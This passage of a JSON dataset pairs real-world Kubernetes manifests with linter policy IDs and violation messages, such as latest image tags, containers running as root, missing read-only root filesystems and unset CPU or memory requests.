    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: editgroups.listener.sh\n  namespace: tool-editgroups\n  labels:\n    name: editgroups.listener.sh\n    toolforge: tool\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: editgroups.listener.sh\n      toolforge: tool\n  template:\n    metadata:\n      labels:\n        name: editgroups.listener.sh\n        toolforge: tool\n    spec:\n      containers:\n      - name: listener\n        image: docker-registry.tools.wmflabs.org/toolforge-python37-sssd-base:latest\n        command:\n        - /data/project/editgroups/www/python/src/listener.sh\n        workingDir: /data/project/editgroups/www/python/src\n        env:\n        - name: HOME\n          value: /data/project/editgroups\n        imagePullPolicy: Always\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"listener\" is using an invalid container image, \"docker-registry.tools.wmflabs.org/toolforge-python37-sssd-base:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8530",
    "manifest_path": "data/manifests/the_stack_sample/sample_3187.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: editgroups.listener.sh\n  namespace: tool-editgroups\n  labels:\n    name: editgroups.listener.sh\n    toolforge: tool\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: editgroups.listener.sh\n      toolforge: tool\n  template:\n    metadata:\n      labels:\n        name: editgroups.listener.sh\n        toolforge: tool\n    spec:\n      containers:\n      - name: listener\n        image: docker-registry.tools.wmflabs.org/toolforge-python37-sssd-base:latest\n        command:\n        - /data/project/editgroups/www/python/src/listener.sh\n        workingDir: /data/project/editgroups/www/python/src\n        env:\n        - name: HOME\n          value: /data/project/editgroups\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"listener\" does not have a read-only root file system"
  },
  {
    "id": "8531",
    "manifest_path": "data/manifests/the_stack_sample/sample_3187.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: editgroups.listener.sh\n  namespace: tool-editgroups\n  labels:\n    name: editgroups.listener.sh\n    toolforge: tool\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: editgroups.listener.sh\n      toolforge: tool\n  template:\n    metadata:\n      labels:\n        name: editgroups.listener.sh\n        toolforge: tool\n    spec:\n      containers:\n      - name: listener\n        image: docker-registry.tools.wmflabs.org/toolforge-python37-sssd-base:latest\n        command:\n        - /data/project/editgroups/www/python/src/listener.sh\n        workingDir: /data/project/editgroups/www/python/src\n        env:\n        - name: HOME\n          value: /data/project/editgroups\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"listener\" is not set to runAsNonRoot"
  },
  {
    "id": "8532",
    "manifest_path": "data/manifests/the_stack_sample/sample_3187.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: editgroups.listener.sh\n  namespace: tool-editgroups\n  labels:\n    name: editgroups.listener.sh\n    toolforge: tool\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: editgroups.listener.sh\n      toolforge: tool\n  template:\n    metadata:\n      labels:\n        name: editgroups.listener.sh\n        toolforge: tool\n    spec:\n      containers:\n      - name: listener\n        image: docker-registry.tools.wmflabs.org/toolforge-python37-sssd-base:latest\n        command:\n        - /data/project/editgroups/www/python/src/listener.sh\n        workingDir: /data/project/editgroups/www/python/src\n        env:\n        - name: HOME\n          value: /data/project/editgroups\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"listener\" has cpu request 0"
  },
  {
    "id": "8533",
    "manifest_path": "data/manifests/the_stack_sample/sample_3187.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: editgroups.listener.sh\n  namespace: tool-editgroups\n  labels:\n    name: editgroups.listener.sh\n    toolforge: tool\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: editgroups.listener.sh\n      toolforge: tool\n  template:\n    metadata:\n      labels:\n        name: editgroups.listener.sh\n        toolforge: tool\n    spec:\n      containers:\n      - name: listener\n        image: docker-registry.tools.wmflabs.org/toolforge-python37-sssd-base:latest\n        command:\n        - /data/project/editgroups/www/python/src/listener.sh\n        workingDir: /data/project/editgroups/www/python/src\n        env:\n        - name: HOME\n          value: /data/project/editgroups\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"listener\" has memory limit 0"
  },
  {
    "id": "8534",
    "manifest_path": "data/manifests/the_stack_sample/sample_3192.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes3\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  volumes:\n  - name: volume1\n    nfs:\n      path: /test\n      server: test\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"container1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8535",
    "manifest_path": "data/manifests/the_stack_sample/sample_3192.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes3\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  volumes:\n  - name: volume1\n    nfs:\n      path: /test\n      server: test\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"initcontainer1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8536",
    "manifest_path": "data/manifests/the_stack_sample/sample_3192.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes3\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  volumes:\n  - name: volume1\n    nfs:\n      path: /test\n      server: test\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "8537",
    "manifest_path": "data/manifests/the_stack_sample/sample_3192.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes3\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  volumes:\n  - name: volume1\n    nfs:\n      path: /test\n      server: test\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"initcontainer1\" does not have a read-only root file system"
  },
  {
    "id": "8538",
    "manifest_path": "data/manifests/the_stack_sample/sample_3192.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes3\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  volumes:\n  - name: volume1\n    nfs:\n      path: /test\n      server: test\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "8539",
    "manifest_path": "data/manifests/the_stack_sample/sample_3192.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes3\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  volumes:\n  - name: volume1\n    nfs:\n      path: /test\n      server: test\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"initcontainer1\" has cpu request 0"
  },
  {
    "id": "8540",
    "manifest_path": "data/manifests/the_stack_sample/sample_3192.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes3\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  volumes:\n  - name: volume1\n    nfs:\n      path: /test\n      server: test\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "8541",
    "manifest_path": "data/manifests/the_stack_sample/sample_3192.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes3\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  volumes:\n  - name: volume1\n    nfs:\n      path: /test\n      server: test\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"initcontainer1\" has memory limit 0"
  },
  {
    "id": "8542",
    "manifest_path": "data/manifests/the_stack_sample/sample_3194.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: statusreconciler\n  labels:\n    app: prow\n    component: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210114-dfe4a7d4c0\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --job-config-path=/etc/job-config\n        - --projected-token-file=/var/sa-token/token\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: service-account-token\n          mountPath: /var/sa-token\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config-misc\n          mountPath: /etc/job-config/misc\n          readOnly: true\n        - name: job-config-master\n          mountPath: /etc/job-config/master\n          readOnly: true\n        - name: job-config-3x\n          mountPath: /etc/job-config/3.x\n          readOnly: true\n        - name: job-config-41\n          mountPath: /etc/job-config/4.1\n          readOnly: true\n        - name: job-config-42\n          mountPath: /etc/job-config/4.2\n          readOnly: true\n        - name: job-config-43\n          mountPath: /etc/job-config/4.3\n          readOnly: true\n        - name: job-config-44\n          mountPath: /etc/job-config/4.4\n          readOnly: true\n        - name: job-config-45\n          mountPath: /etc/job-config/4.5\n          readOnly: true\n        - name: job-config-46\n          mountPath: /etc/job-config/4.6\n          readOnly: true\n        - name: job-config-47\n          mountPath: /etc/job-config/4.7\n          readOnly: true\n        - name: job-config-48\n          mountPath: /etc/job-config/4.8\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        resources:\n          requests:\n            memory: 200Mi\n            cpu: 20m\n      volumes:\n      - name: service-account-token\n        projected:\n          sources:\n          - serviceAccountToken:\n              path: token\n      - name: oauth\n        secret:\n          secretName: github-credentials-openshift-ci-robot\n      - name: config\n        configMap:\n          name: config\n      - name: job-config-misc\n        configMap:\n          name: job-config-misc\n      - name: job-config-master\n        configMap:\n          name: job-config-master\n      - name: job-config-3x\n        configMap:\n          name: job-config-3.x\n      - name: job-config-41\n        configMap:\n          name: job-config-4.1\n      - name: job-config-42\n        configMap:\n          name: job-config-4.2\n      - name: job-config-43\n        configMap:\n          name: job-config-4.3\n      - name: job-config-44\n        configMap:\n          name: job-config-4.4\n      - name: job-config-45\n        configMap:\n          name: job-config-4.5\n      - name: job-config-46\n        configMap:\n          name: job-config-4.6\n      - name: job-config-47\n        configMap:\n          name: job-config-4.7\n      - name: job-config-48\n        configMap:\n          name: job-config-4.8\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"statusreconciler\" does not have a read-only root file system"
  },
  {
    "id": "8543",
    "manifest_path": "data/manifests/the_stack_sample/sample_3194.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: statusreconciler\n  labels:\n    app: prow\n    component: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210114-dfe4a7d4c0\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --job-config-path=/etc/job-config\n        - --projected-token-file=/var/sa-token/token\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: service-account-token\n          mountPath: /var/sa-token\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config-misc\n          mountPath: /etc/job-config/misc\n          readOnly: true\n        - name: job-config-master\n          mountPath: /etc/job-config/master\n          readOnly: true\n        - name: job-config-3x\n          mountPath: /etc/job-config/3.x\n          readOnly: true\n        - name: job-config-41\n          mountPath: /etc/job-config/4.1\n          readOnly: true\n        - name: job-config-42\n          mountPath: /etc/job-config/4.2\n          readOnly: true\n        - name: job-config-43\n          mountPath: /etc/job-config/4.3\n          readOnly: true\n        - name: job-config-44\n          mountPath: /etc/job-config/4.4\n          readOnly: true\n        - name: job-config-45\n          mountPath: /etc/job-config/4.5\n          readOnly: true\n        - name: job-config-46\n          mountPath: /etc/job-config/4.6\n          readOnly: true\n        - name: job-config-47\n          mountPath: /etc/job-config/4.7\n          readOnly: true\n        - name: job-config-48\n          mountPath: /etc/job-config/4.8\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        resources:\n          requests:\n            memory: 200Mi\n            cpu: 20m\n      volumes:\n      - name: service-account-token\n        projected:\n          sources:\n          - serviceAccountToken:\n              path: token\n      - name: oauth\n        secret:\n          secretName: github-credentials-openshift-ci-robot\n      - name: config\n        configMap:\n          name: config\n      - name: job-config-misc\n        configMap:\n          name: job-config-misc\n      - name: job-config-master\n        configMap:\n          name: job-config-master\n      - name: job-config-3x\n        configMap:\n          name: job-config-3.x\n      - name: job-config-41\n        configMap:\n          name: job-config-4.1\n      - name: job-config-42\n        configMap:\n          name: job-config-4.2\n      - name: job-config-43\n        configMap:\n          name: job-config-4.3\n      - name: job-config-44\n        configMap:\n          name: job-config-4.4\n      - name: job-config-45\n        configMap:\n          name: job-config-4.5\n      - name: job-config-46\n        configMap:\n          name: job-config-4.6\n      - name: job-config-47\n        configMap:\n          name: job-config-4.7\n      - name: job-config-48\n        configMap:\n          name: job-config-4.8\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"statusreconciler\" not found"
  },
  {
    "id": "8544",
    "manifest_path": "data/manifests/the_stack_sample/sample_3194.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: statusreconciler\n  labels:\n    app: prow\n    component: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210114-dfe4a7d4c0\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --job-config-path=/etc/job-config\n        - --projected-token-file=/var/sa-token/token\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: service-account-token\n          mountPath: /var/sa-token\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config-misc\n          mountPath: /etc/job-config/misc\n          readOnly: true\n        - name: job-config-master\n          mountPath: /etc/job-config/master\n          readOnly: true\n        - name: job-config-3x\n          mountPath: /etc/job-config/3.x\n          readOnly: true\n        - name: job-config-41\n          mountPath: /etc/job-config/4.1\n          readOnly: true\n        - name: job-config-42\n          mountPath: /etc/job-config/4.2\n          readOnly: true\n        - name: job-config-43\n          mountPath: /etc/job-config/4.3\n          readOnly: true\n        - name: job-config-44\n          mountPath: /etc/job-config/4.4\n          readOnly: true\n        - name: job-config-45\n          mountPath: /etc/job-config/4.5\n          readOnly: true\n        - name: job-config-46\n          mountPath: /etc/job-config/4.6\n          readOnly: true\n        - name: job-config-47\n          mountPath: /etc/job-config/4.7\n          readOnly: true\n        - name: job-config-48\n          mountPath: /etc/job-config/4.8\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        resources:\n          requests:\n            memory: 200Mi\n            cpu: 20m\n      volumes:\n      - name: service-account-token\n        projected:\n          sources:\n          - serviceAccountToken:\n              path: token\n      - name: oauth\n        secret:\n          secretName: github-credentials-openshift-ci-robot\n      - name: config\n        configMap:\n          name: config\n      - name: job-config-misc\n        configMap:\n          name: job-config-misc\n      - name: job-config-master\n        configMap:\n          name: job-config-master\n      - name: job-config-3x\n        configMap:\n          name: job-config-3.x\n      - name: job-config-41\n        configMap:\n          name: job-config-4.1\n      - name: job-config-42\n        configMap:\n          name: job-config-4.2\n      - name: job-config-43\n        configMap:\n          name: job-config-4.3\n      - name: job-config-44\n        configMap:\n          name: job-config-4.4\n      - name: job-config-45\n        configMap:\n          name: job-config-4.5\n      - name: job-config-46\n        configMap:\n          name: job-config-4.6\n      - name: job-config-47\n        configMap:\n          name: job-config-4.7\n      - name: job-config-48\n        configMap:\n          name: job-config-4.8\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"statusreconciler\" is not set to runAsNonRoot"
  },
  {
    "id": "8545",
    "manifest_path": "data/manifests/the_stack_sample/sample_3194.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: statusreconciler\n  labels:\n    app: prow\n    component: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210114-dfe4a7d4c0\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --job-config-path=/etc/job-config\n        - --projected-token-file=/var/sa-token/token\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: service-account-token\n          mountPath: /var/sa-token\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config-misc\n          mountPath: /etc/job-config/misc\n          readOnly: true\n        - name: job-config-master\n          mountPath: /etc/job-config/master\n          readOnly: true\n        - name: job-config-3x\n          mountPath: /etc/job-config/3.x\n          readOnly: true\n        - name: job-config-41\n          mountPath: /etc/job-config/4.1\n          readOnly: true\n        - name: job-config-42\n          mountPath: /etc/job-config/4.2\n          readOnly: true\n        - name: job-config-43\n          mountPath: /etc/job-config/4.3\n          readOnly: true\n        - name: job-config-44\n          mountPath: /etc/job-config/4.4\n          readOnly: true\n        - name: job-config-45\n          mountPath: /etc/job-config/4.5\n          readOnly: true\n        - name: job-config-46\n          mountPath: /etc/job-config/4.6\n          readOnly: true\n        - name: job-config-47\n          mountPath: /etc/job-config/4.7\n          readOnly: true\n        - name: job-config-48\n          mountPath: /etc/job-config/4.8\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        resources:\n          requests:\n            memory: 200Mi\n            cpu: 20m\n      volumes:\n      - name: service-account-token\n        projected:\n          sources:\n          - serviceAccountToken:\n              path: token\n      - name: oauth\n        secret:\n          secretName: github-credentials-openshift-ci-robot\n      - name: config\n        configMap:\n          name: config\n      - name: job-config-misc\n        configMap:\n          name: job-config-misc\n      - name: job-config-master\n        configMap:\n          name: job-config-master\n      - name: job-config-3x\n        configMap:\n          name: job-config-3.x\n      - name: job-config-41\n        configMap:\n          name: job-config-4.1\n      - name: job-config-42\n        configMap:\n          name: job-config-4.2\n      - name: job-config-43\n        configMap:\n          name: job-config-4.3\n      - name: job-config-44\n        configMap:\n          name: job-config-4.4\n      - name: job-config-45\n        configMap:\n          name: job-config-4.5\n      - name: job-config-46\n        configMap:\n          name: job-config-4.6\n      - name: job-config-47\n        configMap:\n          name: job-config-4.7\n      - name: job-config-48\n        configMap:\n          name: job-config-4.8\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"statusreconciler\" has memory limit 0"
  },
  {
    "id": "8546",
    "manifest_path": "data/manifests/the_stack_sample/sample_3196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: sszombie-node\n  name: sszombie-node\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sszombie-node\n  template:\n    metadata:\n      labels:\n        app: sszombie-node\n    spec:\n      containers:\n      - image: gcr.io/$PROJECT_ID/sinmetal/sszombie/feature/id/22:60605d1308ff8d193b05aa14e3521319e72414af\n        name: sszombie-node\n        envFrom:\n        - configMapRef:\n            name: sszombie-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sszombie-node\" does not have a read-only root file system"
  },
  {
    "id": "8547",
    "manifest_path": "data/manifests/the_stack_sample/sample_3196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: sszombie-node\n  name: sszombie-node\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sszombie-node\n  template:\n    metadata:\n      labels:\n        app: sszombie-node\n    spec:\n      containers:\n      - image: gcr.io/$PROJECT_ID/sinmetal/sszombie/feature/id/22:60605d1308ff8d193b05aa14e3521319e72414af\n        name: sszombie-node\n        envFrom:\n        - configMapRef:\n            name: sszombie-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sszombie-node\" is not set to runAsNonRoot"
  },
  {
    "id": "8548",
    "manifest_path": "data/manifests/the_stack_sample/sample_3196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: sszombie-node\n  name: sszombie-node\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sszombie-node\n  template:\n    metadata:\n      labels:\n        app: sszombie-node\n    spec:\n      containers:\n      - image: gcr.io/$PROJECT_ID/sinmetal/sszombie/feature/id/22:60605d1308ff8d193b05aa14e3521319e72414af\n        name: sszombie-node\n        envFrom:\n        - configMapRef:\n            name: sszombie-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sszombie-node\" has cpu request 0"
  },
  {
    "id": "8549",
    "manifest_path": "data/manifests/the_stack_sample/sample_3196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: sszombie-node\n  name: sszombie-node\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sszombie-node\n  template:\n    metadata:\n      labels:\n        app: sszombie-node\n    spec:\n      containers:\n      - image: gcr.io/$PROJECT_ID/sinmetal/sszombie/feature/id/22:60605d1308ff8d193b05aa14e3521319e72414af\n        name: sszombie-node\n        envFrom:\n        - configMapRef:\n            name: sszombie-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sszombie-node\" has memory limit 0"
  },
  {
    "id": "8550",
    "manifest_path": "data/manifests/the_stack_sample/sample_3198.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7753\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8551",
    "manifest_path": "data/manifests/the_stack_sample/sample_3198.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7753\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8552",
    "manifest_path": "data/manifests/the_stack_sample/sample_3198.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7753\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8553",
    "manifest_path": "data/manifests/the_stack_sample/sample_3198.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7753\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8554",
    "manifest_path": "data/manifests/the_stack_sample/sample_3198.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7753\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8555",
    "manifest_path": "data/manifests/the_stack_sample/sample_3200.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: website-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: website-app\n  template:\n    metadata:\n      labels:\n        app: website-app\n    spec:\n      serviceAccountName: website-ksa\n      volumes:\n      - name: schema-mapping\n        configMap:\n          name: schema-mapping\n      - name: ai-config\n        configMap:\n          name: ai-config\n      - name: memdb-config\n        configMap:\n          name: memdb-config\n      containers:\n      - name: website\n        image: gcr.io/datcom-ci/datacommons-website:latest\n        imagePullPolicy: Always\n        args: []\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          failureThreshold: 1\n          periodSeconds: 10\n        resources:\n          limits:\n            memory: 3G\n          requests:\n            memory: 3G\n        volumeMounts:\n        - name: ai-config\n          mountPath: /datacommons/ai\n        env:\n        - name: FLASK_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: flaskEnv\n        - name: SECRET_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: secretProject\n        - name: WEBSITE_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: website_hash.txt\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: BOUNCE\n          value: dummy\n      - name: mixer\n        image: gcr.io/datcom-ci/datacommons-mixer:latest\n        imagePullPolicy: Always\n        resources:\n          limits:\n            memory: 6G\n          requests:\n            memory: 6G\n        args:\n        - --mixer_project=$(MIXER_PROJECT)\n        - --store_project=$(STORE_PROJECT)\n        - --bq_dataset=$(BIG_QUERY)\n        